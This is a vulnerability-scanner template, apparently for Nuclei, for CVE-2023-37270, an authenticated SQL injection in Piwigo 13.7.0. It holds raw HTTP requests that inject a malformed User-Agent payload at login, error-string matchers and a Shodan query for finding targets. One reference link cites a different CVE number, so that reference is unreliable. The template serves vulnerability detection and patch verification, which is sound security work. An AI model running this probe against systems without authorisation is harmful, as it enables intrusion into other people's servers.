id: CVE-2023-37270

info:
  name: Piwigo 13.7.0 - SQL Injection
  author: ritikchaddha
  severity: high
  description: |
    Piwigo is open source photo gallery software. Prior to version 13.8.0, there is a SQL Injection vulnerability in the login of the administrator screen. The SQL statement that acquires the HTTP Header `User-Agent` is vulnerable at the endpoint that records user information when logging in to the administrator screen. It is possible to execute arbitrary SQL statements. Someone who wants to exploit the vulnerability must be log in to the administrator screen, even with low privileges. Any SQL statement can be executed. Doing so may leak information from the database. Version 13.8.0 contains a fix for this issue. As another mitigation, those who want to execute a SQL statement verbatim with user-enterable parameters should be sure to escape the parameter contents appropriately.
  reference:
    - https://github.com/Piwigo/Piwigo/security/advisories/GHSA-934w-qj9p-3qcx
    - https://nvd.nist.gov/vuln/detail/CVE-2023-27524
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L
    cvss-score: 7.6
    cve-id: CVE-2023-37270
    cwe-id: CWE-89
  metadata:
    max-request: 2
    verified: true
    shodan-query: http.favicon.hash:540706145
  tags: cve,cve2023,piwigo,sqli,authenticated

http:
  - raw:
      - |
        POST /identification.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: '">{{7*7}}${2*2}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}&login=

      - |
        GET /admin.php?page=user_activity HTTP/1.1
        Host: {{Hostname}}

    host-redirects: true
    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - 'Warning: [mysql error'
          - 'INSERT  INTO'
          - 'SQL syntax;'
        condition: and

      - type: status
        status:
          - 200
